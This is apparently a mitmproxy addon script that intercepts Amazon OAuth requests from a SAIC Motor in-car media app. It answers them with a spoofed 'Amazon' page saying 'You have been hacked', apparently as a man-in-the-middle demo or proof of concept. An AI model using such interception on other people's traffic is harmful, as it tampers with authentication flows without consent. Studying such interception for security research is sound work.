from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    # Check if the request is targeting the "/ap/oa" endpoint
    if "/ap/oa" in flow.request.pretty_url:
        # Check if the redirect_uri parameter matches the problematic URI
        if "redirect_uri=amzn%3A%2F%2Fcom.saicmotor.onlinemedia" in flow.request.pretty_url:
            # Serve a custom HTML page with redirection
            custom_html = """
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Amazon</title>
                <style>
                    body {
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        font-family: Arial, sans-serif;
                        color: #333;
                        background-color: #f7f7f7;
                        text-align: center;
                    }
                    h1 {
                        font-size: 2em;
                        color: #FF9900; /* Amazon's signature color */
                    }
                </style>
            </head>
            <body>
                <h1>You have been hacked :( </h1>
                <p>Your connection is not secure.</p>
            </body>
            </html>
            """
            # Return a custom response with HTTP 403 Forbidden status
            flow.response = http.Response.make(
                403,  # HTTP status code
                custom_html.encode("utf-8"),  # Response body
                {"Content-Type": "text/html"}  # Headers
            )
            # Log the blocking and redirection
            print("Custom redirection page served for: ", flow.request.pretty_url)

